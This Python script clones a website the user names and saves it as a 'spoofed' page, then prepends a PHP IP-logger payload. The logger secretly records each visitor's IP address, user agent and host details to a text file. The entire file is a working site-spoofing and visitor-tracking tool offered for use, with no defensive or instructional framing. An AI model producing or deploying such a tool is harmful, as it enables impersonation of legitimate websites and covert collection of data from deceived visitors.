#!/usr/bin/python
import urllib
import time
import os

# check if old file (spoofed.html) exists 
fileName = 'spoofed.html'
checkIfExist = os.path.isfile(fileName)

# create spoofed.html if not exist
if checkIfExist == 0:
    open(fileName, "w")

# delete spoofed.html if exist (has old data as backup)
if checkIfExist == 1:
    os.remove(fileName)

try:
    print 'Enter website url to spoof e.g (http://google.com)\n'
    url = raw_input()
    print "\n"
    
except IOError:
    print "Must be used as http://yoursite.com"

# download the website code
os.system("cls") 
print 'Spoofing '+ url + ', this may take a few bananas' # didn't specify a unit of time here, so Matt W. decided to make it bananas
urllib.urlretrieve (url, fileName)

# tell the user we finished
print 'Download completed\n\n'

# store downloaded website content in spoofed.html
fileOpen = open(fileName, 'r')
fileContent = fileOpen.read()
fileOpen.close()

# choose what payloads to add to new webpage
print 'Enter corresponding key to add payload:'
print '[1] Add ip logger'
payload = raw_input()

# ip logger payload
if payload == '1':
    ipLogger = '<?php\n$file="iplog.txt";\n$f=fopen($file,"a");\nfwrite($f,"-------------------------"."\n");\nfwrite($f,"IP Address:".$_SERVER["REMOTE_ADDR"]."\n");\nfwrite($f,"User Agemt:".$_SERVER["HTTP_USER_AGENT"]."\n");\nfwrite($f,"Host Name:".php_uname("n")."\n");\nfwrite($f,"Operating System:".php_uname("v")."(".php_uname("s").")"."\n");\nfclose($f);\n?>'
    print '\nCreate new name for file: eg. (google)\n'
    newFileName = raw_input() + '.php'
    print '\nBinding an ip logger to ' + newFileName
    
    makePage = open (newFileName, 'a') ## a will append, w will over-write
    makePage.write(ipLogger)           ## write the ip logger module
    makePage.write(fileContent)	       ## write downloaded html/php code
    makePage.close()		       ## discontinue editing of file
    print '\nBound payload(s) successfully! Exiting in 4 seconds...'
    os.remove(fileName)
    time.sleep(4)		       ## give user time to read

    
